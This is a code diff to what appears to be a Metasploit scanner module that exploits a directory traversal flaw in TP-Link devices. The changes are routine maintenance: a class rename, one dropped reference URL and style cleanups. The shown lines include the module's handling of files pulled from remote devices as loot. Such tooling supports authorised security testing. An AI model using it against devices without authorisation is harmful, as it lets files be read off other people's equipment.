@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
@@ -23,7 +23,6 @@ class Metasploit3 < Msf::Auxiliary
           [ 'OSVDB', '86881' ],
           [ 'BID', '57969' ],
           [ 'EDB', '24504' ],
-          [ 'URL', 'http://www.tp-link.com/en/support/download/?model=TL-WA701ND&version=V1' ],
           [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-011' ]
         ],
       'Author'      => [ 'Michael Messner <devnull[at]s3cur1ty.de>' ],
@@ -84,7 +83,7 @@ class Metasploit3 < Msf::Auxiliary
       loot = store_loot("tplink.traversal.data","text/plain",rhost, res.body,file)
       vprint_good("#{rhost}:#{rport} - File #{file} downloaded to: #{loot}")
 
-      if datastore['VERBOSE'] == true
+      if datastore['VERBOSE']
         vprint_good("#{rhost}:#{rport} - Response - File #{file}:")
         res.body.each_line do |line|
           # the following is the last line of the useless response
@@ -109,7 +108,7 @@ class Metasploit3 < Msf::Auxiliary
         end
         out = false
       end
-    elsif (res and res.code)
+    elsif res && res.code
       vprint_error("#{rhost}:#{rport} - File->#{file} not found")
     end
   end
